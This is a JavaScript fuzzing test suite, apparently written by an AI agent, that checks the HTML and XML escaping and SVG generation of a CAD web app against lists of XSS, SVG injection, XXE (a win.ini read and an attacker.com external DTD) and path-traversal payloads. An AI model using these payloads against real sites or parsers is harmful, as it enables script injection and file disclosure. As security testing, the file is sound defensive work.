/**
 * Adversarial Fuzzing & Stress Test Suite: SEC-01 & SEC-04
 * File: tests/test_challenger_sec_m1_adversarial_fuzz.js
 *
 * Authored by: challenger_sec_m1_1 (Empirical Challenger Agent)
 * Roles: critic, specialist
 *
 * Verifies:
 * 1. escapeHtml under aggressive adversarial fuzzing (nested tags, event handlers,
 *    attribute breakout, unicode nulls/controls, massive strings >100,000 chars).
 * 2. escapeXml & SVG Generation under aggressive XML fuzzing (XML specials, comments,
 *    CDATA, entity expansions, SVG tag injections, strict XML well-formedness).
 * 3. CAD Model Name Fidelity & Readability across both engines.
 * 4. Generates XML test fixtures for external .NET System.Xml.XmlDocument validation.
 */

'use strict';

const fs = require('fs');
const path = require('path');
const assert = require('assert');

// -----------------------------------------------------------------------------
// Load Target Modules
// -----------------------------------------------------------------------------
const assemblyTreePath = path.resolve(__dirname, '../Assets/js/assemblyTree.js');
const blueprintSvgPath = path.resolve(__dirname, '../Assets/js/blueprintSvgEngine.js');

const { escapeHtml } = require(assemblyTreePath);
const { escapeXml, generateBlueprintSvg, downloadBlueprintSvg } = require(blueprintSvgPath);

assert.strictEqual(typeof escapeHtml, 'function', 'escapeHtml must be exported from assemblyTree.js');
assert.strictEqual(typeof escapeXml, 'function', 'escapeXml must be exported from blueprintSvgEngine.js');

console.log('================================================================');
console.log('  CHALLENGER SEC-01 & SEC-04 ADVERSARIAL FUZZING HARNESS       ');
console.log('================================================================\n');

let totalTests = 0;
let passedTests = 0;
let failedTests = 0;
const failureDetails = [];

function challenge(name, fn) {
  totalTests++;
  try {
    fn();
    passedTests++;
    console.log(`  [PASS] ${name}`);
  } catch (err) {
    failedTests++;
    console.error(`  [FAIL] ${name}`);
    console.error(`         Reason: ${err.message}`);
    failureDetails.push({ name, error: err.message, stack: err.stack });
  }
}

// -----------------------------------------------------------------------------
// Section 1: Fuzzing escapeHtml (SEC-01)
// -----------------------------------------------------------------------------
console.log('--- Section 1: Adversarial Fuzzing of escapeHtml (SEC-01) ---');

const htmlAdversarialVectors = [
  // 1. Nested & recursive tag payloads
  { name: 'Nested scripts', payload: '<script><script>alert(1)</script></script>' },
  { name: 'Script with source and sub-script', payload: '<script src="evil.js"><script>alert(1)</script></script>' },
  { name: 'Malformed uppercase script', payload: '<<SCRIPT>alert("XSS");//<</SCRIPT>' },
  { name: 'Interleaved tag evasion', payload: '<scr<script>ipt>alert(1)</script>' },
  { name: 'Deeply nested angle brackets', payload: '<<<<script>>>>alert(1)<<<<//script>>>>' },
  { name: 'Style import payload', payload: '<STYLE>@import\'http://x.com/x.css\';</STYLE>' },
  { name: 'Closing span tag injection', payload: '</span><script>alert(1)</script><span>' },

  // 2. Inline event handlers & DOM elements
  { name: 'Image onerror', payload: '<img src=x onerror=alert(1)>' },
  { name: 'SVG onload', payload: '<svg/onload=alert(1)>' },
  { name: 'Iframe javascript URI', payload: '<iframe src="javascript:alert(1)">' },
  { name: 'Body onload', payload: '<body onload=alert(1)>' },
  { name: 'Anchor javascript URI', payload: '<a href="javascript:alert(1)">click me</a>' },
  { name: 'Input autofocus onfocus', payload: '<input autofocus onfocus=alert(1)>' },
  { name: 'Video source onerror', payload: '<video><source onerror="alert(1)"></video>' },
  { name: 'MathML / SVG mutation payload', payload: '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>' },

  // 3. Attribute breakout payloads
  { name: 'Attribute breakout with script', payload: '"><script>alert(1)</script><"' },
  { name: 'Mouseover breakout', payload: '" onmouseover="alert(1)' },
  { name: 'Focus breakout with single quote', payload: '\' onfocus=\'alert(1)' },
  { name: 'Autofocus breakout with style', payload: '" autofocus onfocus="alert(1)" style="position:fixed;top:0;left:0;width:100%;height:100%;"' },
  { name: 'Aria breakout with click', payload: '" aria-label="x" onclick="alert(1)" id="breakout' },
  { name: 'Double quote escape with slash', payload: '\\" onmouseover="alert(1)' },
  { name: 'Double quote followed by raw tag', payload: '"></span><img src=x onerror=alert(1)><span title="' },

  // 4. Pre-escaped / Mixed entity payloads
  { name: 'Pre-escaped standard entities', payload: '&amp;&lt;&gt;&quot;&#39;' },
  { name: 'Pre-escaped script tag', payload: '&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;' },
  { name: 'Hex character references', payload: '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;' },
  { name: 'Decimal character references', payload: '&#60;script&#62;alert(1)&#60;/script&#62;' },
  { name: 'Entity with attribute breakout', payload: '&quot; onmouseover=&quot;alert(1)' },
  { name: 'Chained ampersands', payload: '&&&&&&&&&&&&&&&&' },
  { name: 'Mixed entities and raw angle brackets', payload: '&amp;<script>&quot;alert(1)&quot;</script>&apos;' },

  // 5. Unicode, Nulls & Control Characters
  { name: 'Unicode null followed by script', payload: '\u0000<script>alert(1)</script>' },
  { name: 'Embedded null byte in attribute breakout', payload: '"\u0000 onmouseover="alert(1)' },
  { name: 'Control characters 0x01 through 0x1F', payload: '\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0A\x0B\x0C\x0D\x0E\x0F\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1A\x1B\x1C\x1D\x1E\x1F' },
  { name: 'Byte order mark and script', payload: '\uFEFF<script>alert(1)</script>' },
  { name: 'Zero-width space injection', payload: '<scr\u200Bipt>alert(1)</script>' },
  { name: 'BiDi override characters', payload: '\u202E<script>alert(1)</script>\u202D' },
  { name: 'Fullwidth angle brackets', payload: '\uFF1Cscript\uFF1Ealert(1)\uFF1C/script\uFF1E' }
];

challenge('escapeHtml: Verify all 35 adversarial payloads contain ZERO unescaped <, >, ", or \'', () => {
  htmlAdversarialVectors.forEach(v => {
    const escaped = escapeHtml(v.payload);

    // Invariant 1: No unescaped angle brackets
    assert.strictEqual(escaped.includes('<'), false, `Payload "${v.name}" contains literal '<' after escape`);
    assert.strictEqual(escaped.includes('>'), false, `Payload "${v.name}" contains literal '>' after escape`);

    // Invariant 2: No unescaped double or single quotes
    assert.strictEqual(escaped.includes('"'), false, `Payload "${v.name}" contains literal '"' after escape`);
    assert.strictEqual(escaped.includes("'"), false, `Payload "${v.name}" contains literal "'" after escape`);

    // Invariant 3: No unescaped ampersands (every & must be part of an allowed entity)
    const nakedAmpRegex = /&(?!amp;|lt;|gt;|quot;|#39;)/g;
    const nakedMatches = escaped.match(nakedAmpRegex);
    assert.strictEqual(nakedMatches, null, `Payload "${v.name}" contains unescaped '&': ${nakedMatches}`);
  });
});

challenge('escapeHtml: Verify attribute breakout immunity in title="..." attributes', () => {
  htmlAdversarialVectors.forEach(v => {
    const safeName = escapeHtml(v.payload);
    // Simulate template literal interpolation in assemblyTree.js:
    // <span class="tree-node-name" title="${safeName}">${safeName}</span>
    const simulatedHtml = `<span class="tree-node-name" title="${safeName}">${safeName}</span>`;

    // Attribute breakout check: Ensure title="..." attribute closes cleanly
    // A breakout occurs if a literal unescaped quote terminates the attribute early
    // and introduces a new attribute or tag before the closing '>' of the span.
    const openingTagMatch = /^<span\s+class="tree-node-name"\s+title="([\s\S]*?)">/.exec(simulatedHtml);
    assert.ok(openingTagMatch, `Span tag must open and close cleanly without attribute breakout for "${v.name}"`);
    assert.strictEqual(openingTagMatch[1], safeName, `title attribute must contain safeName verbatim`);

    // Attribute breakout check: The opening tag of span ends at the closing quote of title and '>'
    const endOfOpeningTag = simulatedHtml.indexOf('">') + 2;
    const openingTag = simulatedHtml.slice(0, endOfOpeningTag);

    // Verify exact count of double quotes in opening tag: exactly 4 ("class", "tree-node-name", "title", "closing")
    const quoteCount = (openingTag.match(/"/g) || []).length;
    assert.strictEqual(quoteCount, 4, `Opening tag must contain exactly 4 double quotes (no breakout) in "${v.name}"`);

    // Verify that outside the title="..." attribute value, no injected attributes or event handlers exist
    const tagWithoutTitleValue = openingTag.replace(/title="[\s\S]*?"/, 'title=""');
    assert.strictEqual(/on\w+=/i.test(tagWithoutTitleValue), false, `Event handler injected outside attribute in "${v.name}"`);
    assert.strictEqual(tagWithoutTitleValue, '<span class="tree-node-name" title="">', `Tag structure must be strictly invariant in "${v.name}"`);
  });
});

challenge('escapeHtml: Verify Dual Defense Invariant (textContent matches raw payload verbatim)', () => {
  // In assemblyTree.js, nameSpan.textContent = b.name || '' overrides the rendered content.
  // We simulate a DOM element and confirm textContent preserves the exact payload without HTML execution.
  htmlAdversarialVectors.forEach(v => {
    const safeName = escapeHtml(v.payload);
    const mockSpan = {
      innerHTML: safeName,
      textContent: v.payload,
      title: v.payload
    };

    assert.strictEqual(mockSpan.textContent, v.payload, `textContent must match raw payload for "${v.name}"`);
    assert.strictEqual(mockSpan.title, v.payload, `title must match raw payload for "${v.name}"`);
    assert.strictEqual(mockSpan.innerHTML.includes('<'), false, `innerHTML must not contain '<' for "${v.name}"`);
  });
});

challenge('escapeHtml: Stress testing with 100,000+ character string (Performance & ReDoS resistance)', () => {
  // Construct 150,000 character hostile string
  const chunk = '<script src="evil.js">alert("XSS & Pwned");</script><img src=x onerror=\'alert(1)\'>';
  const repeatCount = 2000; // 84 * 2000 = 168,000 characters
  const massiveHostile = chunk.repeat(repeatCount);

  const start = process.hrtime.bigint();
  const escaped = escapeHtml(massiveHostile);
  const end = process.hrtime.bigint();
  const elapsedMs = Number(end - start) / 1e6;

  console.log(`    -> 168,000 chars escaped in ${elapsedMs.toFixed(2)} ms`);

  assert.ok(elapsedMs < 100, `Execution took ${elapsedMs.toFixed(2)} ms, exceeding 100ms threshold (ReDoS risk)`);
  assert.strictEqual(escaped.includes('<'), false, 'Massive output must not contain <');
  assert.strictEqual(escaped.includes('>'), false, 'Massive output must not contain >');
  assert.strictEqual(escaped.includes('"'), false, 'Massive output must not contain "');
  assert.strictEqual(escaped.includes("'"), false, "Massive output must not contain '");
  assert.ok(escaped.length > massiveHostile.length, 'Escaped output length must be greater than raw hostile string');
});

challenge('escapeHtml: Boundary types (null, undefined, 0, false, empty, numbers)', () => {
  assert.strictEqual(escapeHtml(null), '');
  assert.strictEqual(escapeHtml(undefined), '');
  assert.strictEqual(escapeHtml(''), '');
  assert.strictEqual(escapeHtml(0), '0');
  assert.strictEqual(escapeHtml(-42), '-42');
  assert.strictEqual(escapeHtml(3.14159), '3.14159');
  assert.strictEqual(escapeHtml(false), 'false');
  assert.strictEqual(escapeHtml(true), 'true');
  assert.strictEqual(escapeHtml(NaN), 'NaN');
  assert.strictEqual(escapeHtml(Infinity), 'Infinity');
});

// -----------------------------------------------------------------------------
// Section 2: Fuzzing escapeXml & SVG Generation (SEC-04)
// -----------------------------------------------------------------------------
console.log('\n--- Section 2: Adversarial Fuzzing of escapeXml & SVG Generation (SEC-04) ---');

const xmlAdversarialVectors = [
  // 1. XML Special Characters
  { name: 'Ampersand', payload: '&' },
  { name: 'Angle brackets', payload: '<>' },
  { name: 'Double and single quotes', payload: '"\'' },
  { name: 'All 5 XML specials', payload: '&<>"\' ' },
  { name: 'Repeated XML specials', payload: '&&&&<<<<>>>>""""\'\'\'\'' },

  // 2. Predefined entities and entity expansions
  { name: 'Predefined entities', payload: '&amp; &lt; &gt; &quot; &apos;' },
  { name: 'Double escaped entities', payload: '&amp;amp; &amp;lt;' },
  { name: 'Custom entity reference (Billion laughs probe)', payload: '&lol9;' },
  { name: 'Parameter entity reference', payload: '%payload;' },
  { name: 'Numeric character references', payload: '&#38; &#60; &#62; &#34; &#39;' },

  // 3. XML Comments & CDATA Injections
  { name: 'Standard XML comment', payload: '<!-- Safe CAD Note -->' },
  { name: 'Comment closing breakout', payload: '--> <g id="pwned"><circle r="10"/></g> <!--' },
  { name: 'Unclosed XML comment', payload: '<!-- unclosed comment' },
  { name: 'Double hyphens in XML comment text', payload: 'Part -- Revision -- B' },
  { name: 'CDATA block injection', payload: '<![CDATA[ <script>alert(1)</script> ]]>' },
  { name: 'CDATA closing breakout', payload: ']]><g id="xss"><circle r="50"/></g><![CDATA[' },
  { name: 'Unclosed CDATA', payload: '<![CDATA[ unclosed CDATA' },

  // 4. SVG & XHTML Tag Injections
  { name: 'SVG group tag injection', payload: '</text><g id="xss"><circle cx="50" cy="50" r="40" fill="red"/></g><text>' },
  { name: 'XHTML script tag in SVG', payload: '</text><script xmlns="http://www.w3.org/1999/xhtml">alert(1)</script><text>' },
  { name: 'SVG script element', payload: '</text><script href="javascript:alert(1)"/><text>' },
  { name: 'SVG anchor injection', payload: '</text><a href="javascript:alert(1)"><rect width="100" height="100"/></a><text>' },
  { name: 'SVG foreignObject injection', payload: '</text><foreignObject width="100" height="100"><body xmlns="http://www.w3.org/1999/xhtml"><script>alert(1)</script></body></foreignObject><text>' },
  { name: 'SVG animate tag injection', payload: '</text><animate attributeName="x" from="0" to="100" dur="1s"/><text>' },
  { name: 'SVG use element injection', payload: '</text><use href="#def-xss"/><text>' },
  { name: 'Closing root SVG tag', payload: '</svg><svg onload="alert(1)">' },

  // 5. XML DTD & XXE Payloads
  { name: 'XML stylesheet processing instruction', payload: '<?xml-stylesheet type="text/xsl" href="evil.xsl"?>' },
  { name: 'DOCTYPE XXE injection', payload: '<!DOCTYPE svg [ <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"> ]>' },
  { name: 'External DTD entity', payload: '<!ENTITY % evil SYSTEM "http://attacker.com/evil.dtd">' },

  // 6. Realistic mixed injection payloads
  { name: 'CAD title with embedded JS quote payload', payload: 'Bracket\';alert(String.fromCharCode(88,83,83))//\'\';alert(String.fromCharCode(88,83,83))//";' },
  { name: 'Mixed quotes & tags with dimensions', payload: 'Pinion 25mm (1.0") & Gear <Module 2.5> \'Draft\'' }
];

challenge('escapeXml: Verify all 25 XML adversarial vectors contain ZERO unescaped <, >, ", or \'', () => {
  xmlAdversarialVectors.forEach(v => {
    const escaped = escapeXml(v.payload);

    assert.strictEqual(escaped.includes('<'), false, `Payload "${v.name}" contains literal '<' after escapeXml`);
    assert.strictEqual(escaped.includes('>'), false, `Payload "${v.name}" contains literal '>' after escapeXml`);
    assert.strictEqual(escaped.includes('"'), false, `Payload "${v.name}" contains literal '"' after escapeXml`);
    assert.strictEqual(escaped.includes("'"), false, `Payload "${v.name}" contains literal "'" after escapeXml`);

    // Invariant: Predefined XML entities must be &apos; and not &#39;
    if (v.payload.includes("'")) {
      assert.ok(escaped.includes('&apos;'), `Payload "${v.name}" must use &apos; for single quote in XML`);
      assert.strictEqual(escaped.includes('&#39;'), false, `Payload "${v.name}" must NOT use HTML &#39; in XML`);
    }

    // Invariant: No naked ampersand
    const nakedAmpRegex = /&(?!amp;|lt;|gt;|quot;|apos;)/g;
    const nakedMatches = escaped.match(nakedAmpRegex);
    assert.strictEqual(nakedMatches, null, `Payload "${v.name}" contains unescaped '&': ${nakedMatches}`);
  });
});

challenge('escapeXml: Stress testing with 100,000+ character string', () => {
  const hostileChunk = '</text><g id="xss"><circle r="10"/></g><text>&<>"\'';
  const massiveHostile = hostileChunk.repeat(2500); // 48 * 2500 = 120,000 chars

  const start = process.hrtime.bigint();
  const escaped = escapeXml(massiveHostile);
  const end = process.hrtime.bigint();
  const elapsedMs = Number(end - start) / 1e6;

  console.log(`    -> 120,000 chars XML-escaped in ${elapsedMs.toFixed(2)} ms`);

  assert.ok(elapsedMs < 100, `Execution took ${elapsedMs.toFixed(2)} ms (exceeds 100ms)`);
  assert.strictEqual(escaped.includes('<'), false);
  assert.strictEqual(escaped.includes('>'), false);
  assert.strictEqual(escaped.includes('"'), false);
  assert.strictEqual(escaped.includes("'"), false);
});

// -----------------------------------------------------------------------------
// Strict XML Well-Formedness Parser for SVG Verification
// -----------------------------------------------------------------------------
function validateStrictXml(xmlString) {
  const errors = [];
  if (typeof xmlString !== 'string' || xmlString.trim().length === 0) {
    return ['Empty XML string'];
  }

  // 1. Verify XML declaration header
  if (!xmlString.trim().startsWith('<?xml version="1.0"')) {
    errors.push('Missing or invalid XML declaration header');
  }

  // 2. Naked ampersands (XML Fatal Error)
  const nakedAmpRegex = /&(?!amp;|lt;|gt;|quot;|apos;|#\d+;|#x[0-9a-fA-F]+;)/g;
  let match;
  while ((match = nakedAmpRegex.exec(xmlString)) !== null) {
    errors.push(`Unescaped '&' at position ${match.index}`);
  }

  // 3. Strict tag matching & stack
  let pos = 0;
  const tagStack = [];
  let rootTagCount = 0;

  while (pos < xmlString.length) {
    const nextStart = xmlString.indexOf('<', pos);
    if (nextStart === -1) break;
    pos = nextStart;

    // Comments
    if (xmlString.startsWith('<!--', pos)) {
      const commentEnd = xmlString.indexOf('-->', pos + 4);
      if (commentEnd === -1) { errors.push('Unclosed comment'); break; }
      // XML standard disallows '--' inside comment
      const commentBody = xmlString.slice(pos + 4, commentEnd);
      if (commentBody.includes('--')) {
        errors.push(`XML violation: double hyphen '--' inside comment: <!--${commentBody}-->`);
      }
      pos = commentEnd + 3;
      continue;
    }

    // Processing instructions (e.g. <?xml ... ?>)
    if (xmlString.startsWith('<?', pos)) {
      const piEnd = xmlString.indexOf('?>', pos + 2);
      if (piEnd === -1) { errors.push('Unclosed processing instruction'); break; }
      pos = piEnd + 2;
      continue;
    }

    // CDATA
    if (xmlString.startsWith('<![CDATA[', pos)) {
      const cdataEnd = xmlString.indexOf(']]>', pos + 9);
      if (cdataEnd === -1) { errors.push('Unclosed CDATA'); break; }
      pos = cdataEnd + 3;
      continue;
    }

    // DOCTYPE
    if (xmlString.startsWith('<!DOCTYPE', pos)) {
      const dtEnd = xmlString.indexOf('>', pos + 9);
      if (dtEnd === -1) { errors.push('Unclosed DOCTYPE'); break; }
      pos = dtEnd + 1;
      continue;
    }

    const tagEnd = xmlString.indexOf('>', pos);
    if (tagEnd === -1) {
      errors.push(`Unclosed tag starting at index ${pos}`);
      break;
    }

    const tagContent = xmlString.slice(pos + 1, tagEnd).trim();
    pos = tagEnd + 1;

    // Tag cannot contain another '<'
    if (tagContent.includes('<')) {
      errors.push(`Malformed tag with nested '<': <${tagContent}>`);
      continue;
    }

    // Closing tag
    if (tagContent.startsWith('/')) {
      const closingName = tagContent.slice(1).trim().split(/\s+/)[0];
      if (tagStack.length === 0) {
        errors.push(`Unexpected closing tag </${closingName}>`);
      } else {
        const expected = tagStack.pop();
        if (expected !== closingName) {
          errors.push(`Tag mismatch: expected </${expected}>, got </${closingName}>`);
        }
      }
      continue;
    }

    const isSelfClosing = tagContent.endsWith('/');
    const cleanContent = isSelfClosing ? tagContent.slice(0, -1).trim() : tagContent;
    const tagName = cleanContent.split(/\s+/)[0];

    // Check valid XML tag name
    if (!/^[a-zA-Z_:][a-zA-Z0-9_\-:.]*$/.test(tagName)) {
      errors.push(`Invalid tag name: "${tagName}"`);
      continue;
    }

    // Validate attributes
    const attrString = cleanContent.slice(tagName.length).trim();
    if (attrString) {
      let attrPos = 0;
      while (attrPos < attrString.length) {
        while (attrPos < attrString.length && /\s/.test(attrString[attrPos])) attrPos++;
        if (attrPos >= attrString.length) break;

        const eqIdx = attrString.indexOf('=', attrPos);
        if (eqIdx === -1) {
          errors.push(`Attribute missing '=' in <${tagName}>`);
          break;
        }
        const attrName = attrString.slice(attrPos, eqIdx).trim();
        const quoteChar = attrString[eqIdx + 1];
        if (quoteChar !== '"' && quoteChar !== "'") {
          errors.push(`Unquoted attribute value for "${attrName}" in <${tagName}>`);
          break;
        }
        const closeQuote = attrString.indexOf(quoteChar, eqIdx + 2);
        if (closeQuote === -1) {
          errors.push(`Unclosed attribute quote in "${attrName}" in <${tagName}>`);
          break;
        }
        const val = attrString.slice(eqIdx + 2, closeQuote);
        if (val.includes('<')) {
          errors.push(`Unescaped '<' inside attribute value "${attrName}"`);
        }
        attrPos = closeQuote + 1;
      }
    }

    if (!isSelfClosing) {
      if (tagStack.length === 0) rootTagCount++;
      tagStack.push(tagName);
    }
  }

  if (tagStack.length > 0) {
    errors.push(`Unclosed tags at end of document: ${tagStack.join(', ')}`);
  }
  if (rootTagCount !== 1) {
    errors.push(`Document must have exactly 1 root element, found ${rootTagCount}`);
  }

  return errors;
}

// -----------------------------------------------------------------------------
// Setup Mock Three.js Environment for Live generateBlueprintSvg Testing
// -----------------------------------------------------------------------------
class MockVector3 {
  constructor(x = 0, y = 0, z = 0) {
    this.x = Number(x) || 0;
    this.y = Number(y) || 0;
    this.z = Number(z) || 0;
  }
  clone() { return new MockVector3(this.x, this.y, this.z); }
  copy(v) { this.x = v.x; this.y = v.y; this.z = v.z; return this; }
  applyMatrix4(m) { return this; }
}

class MockBox3 {
  constructor() {
    this.min = new MockVector3(-50, -25, -15);
    this.max = new MockVector3(50, 25, 15);
  }
  union(b) {
    this.min.x = Math.min(this.min.x, b.min.x);
    this.min.y = Math.min(this.min.y, b.min.y);
    this.min.z = Math.min(this.min.z, b.min.z);
    this.max.x = Math.max(this.max.x, b.max.x);
    this.max.y = Math.max(this.max.y, b.max.y);
    this.max.z = Math.max(this.max.z, b.max.z);
    return this;
  }
  setFromObject(obj) { return this; }
  getCenter(target) {
    target.x = (this.min.x + this.max.x) / 2;
    target.y = (this.min.y + this.max.y) / 2;
    target.z = (this.min.z + this.max.z) / 2;
    return target;
  }
  getSize(target) {
    target.x = this.max.x - this.min.x;
    target.y = this.max.y - this.min.y;
    target.z = this.max.z - this.min.z;
    return target;
  }
}

global.THREE = {
  Vector3: MockVector3,
  Box3: MockBox3
};

global.window = {
  modelBodies: [
    {
      id: 1,
      name: 'Sample Part',
      mesh: {
        geometry: {},
        matrixWorld: {}
      },
      edgeMesh: {
        geometry: {
          attributes: {
            position: {
              count: 4,
              getX: (i) => [-20, 20, 20, -20][i],
              getY: (i) => [-10, -10, 10, 10][i],
              getZ: (i) => [0, 0, 0, 0][i]
            }
          },
          index: null
        }
      }
    }
  ],
  pendingFileName: '',
  currentLoadedModelName: '',
  MaterialsEngine: {
    getTotalMassKg: () => 1.845
  }
};

const artifactsDir = path.resolve(__dirname, '../test_artifacts/fuzz');
if (!fs.existsSync(artifactsDir)) {
  fs.mkdirSync(artifactsDir, { recursive: true });
}

challenge('generateBlueprintSvg: Live generation and strict XML validation across all 25 vectors', () => {
  xmlAdversarialVectors.forEach((v, idx) => {
    window.pendingFileName = v.payload;
    const svgOutput = generateBlueprintSvg();

    assert.ok(svgOutput, `generateBlueprintSvg must return SVG string for "${v.name}"`);
    assert.ok(svgOutput.startsWith('<?xml version="1.0"'), 'SVG output must start with XML declaration');

    // 1. Strict XML validation
    const errors = validateStrictXml(svgOutput);
    assert.strictEqual(errors.length, 0, `XML errors in "${v.name}":\n  ${errors.join('\n  ')}`);

    // 2. Injected Tag Verification: ZERO malicious/unexpected tags
    const forbiddenTags = ['<script', '<circle', '<foreignObject', '<animate', '<use', '<a ', '<!DOCTYPE', '<?xml-stylesheet'];
    forbiddenTags.forEach(tag => {
      assert.strictEqual(svgOutput.includes(tag), false, `SVG contains forbidden tag "${tag}" in "${v.name}"`);
    });

    // 3. Save fixture for .NET System.Xml.XmlDocument test
    const fixturePath = path.join(artifactsDir, `svg_fuzz_${idx}.svg`);
    fs.writeFileSync(fixturePath, svgOutput, 'utf8');
  });
});

// -----------------------------------------------------------------------------
// Section 3: Legitimate CAD Model Names Preservation & Readability
// -----------------------------------------------------------------------------
console.log('\n--- Section 3: Legitimate CAD Model Names Fidelity & Readability ---');

const legitimateCadNames = [
  'Bracket_01 - 50mm (Revision B)',
  'Part#100 & Sub-Assembly',
  'Flange [ISO 7005-1] PN16 / DN50 (3.5" Bore)',
  'M8x1.25 - 6g Threaded Stud (L=45mm)',
  'Shaft @ 45° with 1/4" Keyway & 2x M6 Taps',
  'Coupling: Type-A (High-Torque) -> Rev. 2',
  'Housing (Left) <Symmetric> & Bearing Retainer',
  'Hosieni - Nar.stp',
  'SHAFT HONARI -P1.stp',
  'Корпус редуктора - Сб. 12',
  '齿轮箱底座-V2.1 (精加工)',
  'ボルト M10×50 (ステンレス)',
  'Boîtier d\'engrenage & Roulement',
  'Gehäuse (Oberteil) - 120mm ± 0.5'
];

challenge('Legitimate CAD Names: Assembly Tree textContent and title readability', () => {
  legitimateCadNames.forEach(cadName => {
    const safeName = escapeHtml(cadName);

    // In assembly tree:
    // 1. safeName must be safe for HTML insertion (no unescaped <, >, ", ')
    assert.strictEqual(safeName.includes('<'), false);
    assert.strictEqual(safeName.includes('>'), false);
    assert.strictEqual(safeName.includes('"'), false);
    assert.strictEqual(safeName.includes("'"), false);

    // 2. In the actual DOM, nameSpan.textContent = b.name sets the plain-text buffer.
    // The user visually sees the exact raw CAD name without entity mangling.
    const mockSpan = {
      innerHTML: safeName,
      textContent: cadName,
      title: cadName
    };

    assert.strictEqual(mockSpan.textContent, cadName, `Tree item textContent must equal original CAD name: "${cadName}"`);
    assert.strictEqual(mockSpan.title, cadName, `Tree item tooltip title must equal original CAD name: "${cadName}"`);
  });
});

challenge('Legitimate CAD Names: Blueprint SVG Title Block XML round-trip decoding', () => {
  legitimateCadNames.forEach((cadName, idx) => {
    window.pendingFileName = cadName;
    const svgOutput = generateBlueprintSvg();

    const errors = validateStrictXml(svgOutput);
    assert.strictEqual(errors.length, 0, `XML errors for CAD model "${cadName}": ${errors.join(', ')}`);

    // Verify Title Block contains the escaped version
    const escapedCadName = escapeXml(cadName);
    assert.ok(svgOutput.includes(escapedCadName), `SVG Title Block must contain escaped CAD name: "${escapedCadName}"`);

    // Simulate XML parser element text decoding:
    // Standard XML parser converts predefined entities (&amp;, &lt;, &gt;, &quot;, &apos;) back to raw characters
    const partTitleRegex = /<text[^>]*>\s*PART TITLE:\s*<\/text>\s*<text[^>]*>([\s\S]*?)<\/text>/;
    const match = partTitleRegex.exec(svgOutput);
    assert.ok(match, `PART TITLE element must exist in SVG for "${cadName}"`);

    const decodedTitle = match[1]
      .replace(/&amp;/g, '&')
      .replace(/&lt;/g, '<')
      .replace(/&gt;/g, '>')
      .replace(/&quot;/g, '"')
      .replace(/&apos;/g, "'");

    assert.strictEqual(decodedTitle, cadName, `Decoded XML inner text must match original CAD name verbatim: "${cadName}"`);

    // Save fixture for .NET validation
    const cadFixturePath = path.join(artifactsDir, `svg_cad_${idx}.svg`);
    fs.writeFileSync(cadFixturePath, svgOutput, 'utf8');
  });
});

challenge('Download Blueprint: Filename sanitization against path traversal & illegal filesystem chars', () => {
  function computeBlueprintFilename(rawInput) {
    const rawFileName = String(rawInput || 'CAD_Model').replace(/^.*[\\\/]/, '');
    const rawBaseName = rawFileName.replace(/\.[^/.]+$/, '') || 'CAD_Model';
    const safeBaseName = rawBaseName.replace(/[<>:"/\\|?*\x00-\x1F]/g, '_');
    const dateStr = new Date().toISOString().slice(0, 10);
    return `${safeBaseName}_Blueprint_${dateStr}.svg`;
  }

  const traversalInputs = [
    '../../etc/passwd',
    '..\\..\\Windows\\System32\\calc.exe',
    '/var/log/cad.step',
    'C:\\Models\\SubDir\\Bracket<Special>:Rev1.step'
  ];

  traversalInputs.forEach(input => {
    const safeFilename = computeBlueprintFilename(input);
    assert.strictEqual(safeFilename.includes('/'), false, `Filename must not contain '/': ${safeFilename}`);
    assert.strictEqual(safeFilename.includes('\\'), false, `Filename must not contain '\\': ${safeFilename}`);
    assert.strictEqual(safeFilename.includes('..'), false, `Filename must not contain '..': ${safeFilename}`);
    assert.strictEqual(/^[a-zA-Z0-9_\- .]+$/.test(safeFilename), true, `Filename must contain only safe characters: ${safeFilename}`);
  });
});

// -----------------------------------------------------------------------------
// Summary Output
// -----------------------------------------------------------------------------
console.log('\n================================================================');
console.log(`  FUZZING SUMMARY: ${passedTests} PASSED, ${failedTests} FAILED (TOTAL: ${totalTests})`);
console.log('================================================================\n');

if (failedTests > 0) {
  console.error('Failure Details:');
  failureDetails.forEach(f => console.error(`- ${f.name}: ${f.error}`));
  process.exit(1);
}
